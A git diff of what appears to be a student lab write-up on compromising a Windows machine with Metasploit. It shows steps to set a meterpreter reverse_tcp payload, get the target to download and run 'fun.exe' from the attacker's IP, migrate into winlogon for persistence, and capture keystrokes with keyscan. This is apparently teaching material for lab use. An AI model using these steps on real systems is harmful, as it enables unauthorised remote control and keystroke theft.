@@ -53,25 +53,16 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 ![Screenshot 2024-04-16 143844](https://github.com/Vinothini1711/Echoserver/assets/144300204/7defa3b3-ad2f-4ed8-b026-862a5b0a8325)
 exploit
-
-
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.1.2/fun.exe
 The file "fun.exe" downloads. 
 ![download](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/a6b73051-a143-4740-b3d9-27c23762218f)
-
 Bypass any warning boxes, double-click the file, and allow it to run.
-
 On kali give the command exploit
-
 ![exploit](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/b46a08f7-a9fc-4e71-8fdd-170ee187dd22)
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
-
-![meterpreter-ps](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/7e6e28fb-b095-4fd1-81f8-a0292f82c9a2)
-
-
 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
 To become more persistent, we'll migrate to a process that will last longer.
 Let's migrate to the winlogon process.
@@ -91,8 +82,5 @@ keyscan_start	Begins capturing keys typed in the target. On the Windows target, 
 ![notepad](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/35be18d7-51b0-4529-8fd8-76740f0c9ba6)
 keyscan_dump	Shows the keystrokes captured so far
 ![keyscan_dump](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d40a4428-0c65-4855-be1d-c278766082fb)
-
-
-
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
